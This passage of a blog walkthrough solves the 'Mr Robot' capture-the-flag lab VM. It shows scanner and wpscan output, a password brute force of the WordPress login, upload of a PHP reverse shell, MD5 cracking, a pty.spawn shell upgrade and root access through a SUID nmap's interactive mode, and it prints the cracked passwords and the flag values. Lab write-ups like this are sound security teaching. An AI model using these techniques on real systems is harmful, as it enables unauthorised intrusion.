<p>I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Crawler Started:
</span><span class='line'>| Plugin name: FCKeditor upload test v.1 Loaded.
</span><span class='line'>| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
</span><span class='line'>| Plugin name: Upload Form Detect v.1.1 Loaded.
</span><span class='line'>| Plugin name: phpinfo() Disclosure v.1 Loaded.
</span><span class='line'>| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
</span><span class='line'>| Plugin name: Code Disclosure v.1.1 Loaded.
</span><span class='line'>| Plugin name: E-mail Detection v.1.1 Loaded.
</span><span class='line'>| Plugin name: External Host Detect v.1.2 Loaded.
</span><span class='line'>| [+] Crawling finished, 59 URL's found!
</span><span class='line'>
</span><span class='line'>Dynamic tests:
</span><span class='line'>| Plugin name: Learning New Directories v.1.2 Loaded.
</span><span class='line'>| Plugin name: FCKedior tests v.1.1 Loaded.
</span><span class='line'>| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
</span><span class='line'>| Plugin name: Find Backup Files v.1.2 Loaded.
</span><span class='line'>| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
</span><span class='line'>| Plugin name: Local File Include tests v.1.1 Loaded.
</span><span class='line'>| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
</span><span class='line'>| Plugin name: Remote Command Execution tests v.1.1 Loaded.
</span><span class='line'>| Plugin name: Remote File Include tests v.1.2 Loaded.
</span><span class='line'>| Plugin name: SQL-injection tests v.1.2 Loaded.
</span><span class='line'>| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
</span><span class='line'>| Plugin name: Web Shell Finder v.1.3 Loaded.</span></code></pre></td></tr></table></div></figure>


<p>And the tool did find some useful information for further compromising the target!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>===================================================================================================
</span><span class='line'>|
</span><span class='line'>| Directory check:
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/Image/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/feed/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/image/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/login/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/rss/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/wp-login/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/wp-admin/
</span><span class='line'>===================================================================================================
</span><span class='line'>|                                                                                                   
</span><span class='line'>| File check:
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/index.html
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/index.php
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/favicon.ico
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.html
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.html%20
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.php
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/license.txt
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/readme.html
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/readme
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/robots.txt
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/htx/sqlqhit.asp
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/htx/SQLQHit.asp
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/sqlqhit.asp
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/SQLQHit.asp
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/sitemap.xml
</span><span class='line'>===================================================================================================</span></code></pre></td></tr></table></div></figure>


<p>What do you know, a Wordpress instance is running on the server! So it&rsquo;s time for wpscan!</p>

<h3>wpscan description</h3>

<p>Homepage: <a href="https://wpscan.org/">https://wpscan.org/</a></p>

<blockquote><p>WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>

<h3>wpscan options</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --help
</span><span class='line'>_______________________________________________________________
</span><span class='line'>        __          _______   _____                  
</span><span class='line'>        \ \        / /  __ \ / ____|                 
</span><span class='line'>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
</span><span class='line'>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
</span><span class='line'>           \  /\  /  | |     ____) | (__| (_| | | | |
</span><span class='line'>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span><span class='line'>
</span><span class='line'>        WordPress Security Scanner by the WPScan Team 
</span><span class='line'>                       Version 2.9.2
</span><span class='line'>          Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
</span><span class='line'>_______________________________________________________________
</span><span class='line'>
</span><span class='line'>Help :
</span><span class='line'>
</span><span class='line'>Some values are settable in a config file, see the example.conf.json
</span><span class='line'>
</span><span class='line'>--update                            Update the database to the latest version.
</span><span class='line'>--url       | -u &lt;target url&gt;       The WordPress URL/domain to scan.
</span><span class='line'>--force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
</span><span class='line'>--enumerate | -e [option(s)]        Enumeration.
</span><span class='line'>  option :
</span><span class='line'>    u        usernames from id 1 to 10
</span><span class='line'>    u[10-20] usernames from id 10 to 20 (you must write [] chars)
</span><span class='line'>    p        plugins
</span><span class='line'>    vp       only vulnerable plugins
</span><span class='line'>    ap       all plugins (can take a long time)
</span><span class='line'>    tt       timthumbs
</span><span class='line'>    t        themes
</span><span class='line'>    vt       only vulnerable themes
</span><span class='line'>    at       all themes (can take a long time)
</span><span class='line'>  Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
</span><span class='line'>  If no option is supplied, the default is "vt,tt,u,vp"
</span><span class='line'>
</span><span class='line'>--exclude-content-based "&lt;regexp or string&gt;"
</span><span class='line'>                                    Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
</span><span class='line'>                                    You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
</span><span class='line'>--config-file  | -c &lt;config file&gt;   Use the specified config file, see the example.conf.json.
</span><span class='line'>--user-agent   | -a &lt;User-Agent&gt;    Use the specified User-Agent.
</span><span class='line'>--cookie &lt;string&gt;                   String to read cookies from.
</span><span class='line'>--random-agent | -r                 Use a random User-Agent.
</span><span class='line'>--follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
</span><span class='line'>--batch                             Never ask for user input, use the default behaviour.
</span><span class='line'>--no-color                          Do not use colors in the output.
</span><span class='line'>--log                               Creates a log.txt file with WPScan's output.
</span><span class='line'>--no-banner                         Prevents the WPScan banner from being displayed.
</span><span class='line'>--disable-accept-header             Prevents WPScan sending the Accept HTTP header.
</span><span class='line'>--disable-referer                   Prevents setting the Referer header.
</span><span class='line'>--disable-tls-checks                Disables SSL/TLS certificate verification.
</span><span class='line'>--wp-content-dir &lt;wp content dir&gt;   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.
</span><span class='line'>                                    Subdirectories are allowed.
</span><span class='line'>--wp-plugins-dir &lt;wp plugins dir&gt;   Same thing than --wp-content-dir but for the plugins directory.
</span><span class='line'>                                    If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
</span><span class='line'>--proxy &lt;[protocol://]host:port&gt;    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.
</span><span class='line'>                                    If no protocol is given (format host:port), HTTP will be used.
</span><span class='line'>--proxy-auth &lt;username:password&gt;    Supply the proxy login credentials.
</span><span class='line'>--basic-auth &lt;username:password&gt;    Set the HTTP Basic authentication.
</span><span class='line'>--wordlist | -w &lt;wordlist&gt;          Supply a wordlist for the password brute forcer.
</span><span class='line'>--username | -U &lt;username&gt;          Only brute force the supplied username.
</span><span class='line'>--usernames     &lt;path-to-file&gt;      Only brute force the usernames from the file.
</span><span class='line'>--cache-dir       &lt;cache-directory&gt; Set the cache directory.
</span><span class='line'>--cache-ttl       &lt;cache-ttl&gt;       Typhoeus cache TTL.
</span><span class='line'>--request-timeout &lt;request-timeout&gt; Request Timeout.
</span><span class='line'>--connect-timeout &lt;connect-timeout&gt; Connect Timeout.
</span><span class='line'>--threads  | -t &lt;number of threads&gt; The number of threads to use when multi-threading requests.
</span><span class='line'>--max-threads     &lt;max-threads&gt;     Maximum Threads.
</span><span class='line'>--throttle        &lt;milliseconds&gt;    Milliseconds to wait before doing another web request. If used, the --threads should be set to 1.
</span><span class='line'>--help     | -h                     This help screen.
</span><span class='line'>--verbose  | -v                     Verbose output.
</span><span class='line'>--version                           Output the current version and exit.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Examples :
</span><span class='line'>
</span><span class='line'>-Further help ...
</span><span class='line'>ruby ./wpscan.rb --help
</span><span class='line'>
</span><span class='line'>-Do 'non-intrusive' checks ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com
</span><span class='line'>
</span><span class='line'>-Do wordlist password brute force on enumerated users using 50 threads ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50
</span><span class='line'>
</span><span class='line'>-Do wordlist password brute force on the 'admin' username only ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --username admin
</span><span class='line'>
</span><span class='line'>-Enumerate installed plugins ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate p
</span><span class='line'>
</span><span class='line'>-Enumerate installed themes ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate t
</span><span class='line'>
</span><span class='line'>-Enumerate users ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate u
</span><span class='line'>
</span><span class='line'>-Enumerate installed timthumbs ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate tt
</span><span class='line'>
</span><span class='line'>-Use a HTTP proxy ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --proxy 127.0.0.1:8118
</span><span class='line'>
</span><span class='line'>-Use a SOCKS5 proxy ... (cURL &gt;= v7.21.7 needed)
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --proxy socks5://127.0.0.1:9000
</span><span class='line'>
</span><span class='line'>-Use custom content directory ...
</span><span class='line'>ruby ./wpscan.rb -u www.example.com --wp-content-dir custom-content
</span><span class='line'>
</span><span class='line'>-Use custom plugins directory ...
</span><span class='line'>ruby ./wpscan.rb -u www.example.com --wp-plugins-dir wp-content/custom-plugins
</span><span class='line'>
</span><span class='line'>-Update the DB ...
</span><span class='line'>ruby ./wpscan.rb --update
</span><span class='line'>
</span><span class='line'>-Debug output ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --debug-output 2&gt;debug.log
</span><span class='line'>
</span><span class='line'>See README for further information.</span></code></pre></td></tr></table></div></figure>


<p>First, I updated the wpscan databse with <code>wpscan &mdash;update</code>. Then I performed some enumeration on the target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --url http://192.168.217.145 --enumerate u vp vt --no-banner
</span><span class='line'>[+] URL: http://192.168.217.145/
</span><span class='line'>[+] Started: Sat Jul  1 07:40:05 2017
</span><span class='line'>
</span><span class='line'>[+] robots.txt available under: 'http://192.168.217.145/robots.txt'
</span><span class='line'>[!] The WordPress 'http://192.168.217.145/readme.html' file exists exposing a version number
</span><span class='line'>[+] Interesting header: SERVER: Apache
</span><span class='line'>[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
</span><span class='line'>[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
</span><span class='line'>[+] XML-RPC Interface available under: http://192.168.217.145/xmlrpc.php
</span><span class='line'>
</span><span class='line'>[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml
</span><span class='line'>[!] 1 vulnerability identified from the version number
</span><span class='line'>
</span><span class='line'>[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset
</span><span class='line'>    Reference: https://wpvulndb.com/vulnerabilities/8807
</span><span class='line'>    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
</span><span class='line'>    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
</span><span class='line'>    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
</span><span class='line'>
</span><span class='line'>[+] Enumerating plugins from passive detection ...
</span><span class='line'>[+] No plugins found
</span><span class='line'>
</span><span class='line'>[+] Enumerating usernames ...
</span><span class='line'>[+] We did not enumerate any usernames
</span><span class='line'>
</span><span class='line'>[+] Finished: Sat Jul  1 07:40:07 2017
</span><span class='line'>[+] Requests Done: 57
</span><span class='line'>[+] Memory used: 17.109 MB
</span><span class='line'>[+] Elapsed time: 00:00:02</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t use wpscan&rsquo;s findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l fsocity.dic 
</span><span class='line'>858160 fsocity.dic</span></code></pre></td></tr></table></div></figure>


<p>Not a small one, but maybe it contains duplicates:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sort fsocity.dic | uniq | wc -l
</span><span class='line'>11451</span></code></pre></td></tr></table></div></figure>


<p>A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.</p>

<p>The next step was to visit <a href="http://192.168.217.145/wp-login.php">http://192.168.217.145/wp-login.php</a> and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/wplogin.png" title="wplogin" alt="wplogin"></p>

<p>It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that&rsquo;s how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --url http://192.168.217.145/ --wordlist ~/Downloads/fsociety.txt --username elliot
</span><span class='line'>[...]
</span><span class='line'>[+] Starting the password brute forcer
</span><span class='line'>  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                                  
</span><span class='line'>
</span><span class='line'>  Brute Forcing 'elliot' Time: 00:02:27 &lt;==================================                                    &gt; (5640 / 11452) 49.24%  ETA: 00:02:32
</span><span class='line'>  +----+--------+------+-----------+
</span><span class='line'>  | Id | Login  | Name | Password  |
</span><span class='line'>  +----+--------+------+-----------+
</span><span class='line'>  |    | elliot |      | ER28-0652 |
</span><span class='line'>  +----+--------+------+-----------+</span></code></pre></td></tr></table></div></figure>


<p>Excellent, wpscan found the password is <em>ER28-0652</em>! I logged in and noticed that all the plugins are outdated:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/plugins.png" title="wp plugins" alt="wp plugins"></p>

<p>I tried uploading a PHP reverse shell as plugin, but got an error that it couldn&rsquo;t install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/media.png" title="media library" alt="media library"></p>

<p>Wasn&rsquo;t sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was <a href="http://192.168.217.145/wp-content/uploads/2017/07/shell.php">http://192.168.217.145/wp-content/uploads/2017/07/shell.php</a></p>

<h2>Flag #2</h2>

<p>Finally achieved presence on the machine:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami
</span><span class='line'>daemon
</span><span class='line'>$ ls /home
</span><span class='line'>robot
</span><span class='line'>$ ls -la /home/robot
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
</span><span class='line'>drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
</span><span class='line'>-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
</span><span class='line'>-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5</span></code></pre></td></tr></table></div></figure>


<p>Found the second flag, but couldn&rsquo;t read it. However, that md5 file was readable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /home/robot/password.raw-md5
</span><span class='line'>robot:c3fcd3d76192e4007dfb496cca67e13b</span></code></pre></td></tr></table></div></figure>


<p>I cracked the MD5 hash to reveal the password <em>abcdefghijklmnopqrstuvwxyz</em> for the user robot. I tried switching to that user, but I got the following error:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ su robot
</span><span class='line'>su: must be run from a terminal</span></code></pre></td></tr></table></div></figure>


<p>The error appears because the shell isn&rsquo;t interactive. But I ran into this before, and again <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentestmonkey&rsquo;s oneliners</a> came to the rescue:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'import pty; pty.spawn("/bin/sh")'
</span><span class='line'>$ su robot
</span><span class='line'>su robot
</span><span class='line'>Password: abcdefghijklmnopqrstuvwxyz
</span><span class='line'>
</span><span class='line'>robot@linux:/$ </span></code></pre></td></tr></table></div></figure>


<p>I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it&rsquo;s annoying:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:~$ cat key-2-of-3.txt
</span><span class='line'>cat key-2-of-3.txt
</span><span class='line'>822c73956184f694993bede3eb39f959</span></code></pre></td></tr></table></div></figure>


<h2>Flag #3</h2>

<p>I couldn&rsquo;t find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2&gt; /dev/null
</span><span class='line'>[...]
</span><span class='line'>/usr/local/bin/nmap</span></code></pre></td></tr></table></div></figure>


<p>After Googling, there even seems to be a <a href="https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap">setuid Nmap exploit</a> in Metasploit! I read more about this problem, and found an interesting <a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">SANS paper</a> (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:/$ nmap --interactive
</span><span class='line'>nmap --interactive
</span><span class='line'>
</span><span class='line'>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
</span><span class='line'>Welcome to Interactive Mode -- press h &lt;enter&gt; for help
</span><span class='line'>nmap&gt; </span></code></pre></td></tr></table></div></figure>


<p>The Nmap version is 3.81, so I tried it out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap&gt; !whoami
</span><span class='line'>!whoami
</span><span class='line'>root
</span><span class='line'>waiting to reap child : No child processes</span></code></pre></td></tr></table></div></figure>


<p>It did work! Game over, Mr Robot!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap&gt; !sh
</span><span class='line'>!sh
</span><span class='line'># ls /root
</span><span class='line'>ls /root
</span><span class='line'>firstboot_done    key-3-of-3.txt
</span><span class='line'># cat /root/key-3-of-3.txt
</span><span class='line'>cat /root/key-3-of-3.txt
</span><span class='line'>04787ddef27c3dee1ee161b21670b4e4</span></code></pre></td></tr></table></div></figure>


<p>Another interesting challenge, more story driven. It reminded me of <a href="https://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/">Primer</a>.</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html">Using wpscan to find Wordpress vulnerabilities</a></p></li>
<li><p><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">Attack and Defend: Linux Privilege Escalation Techniques of 2016</a></p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>/ You have literary talent that you \
</span><span class='line'>\ should take pains to develop.     /
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
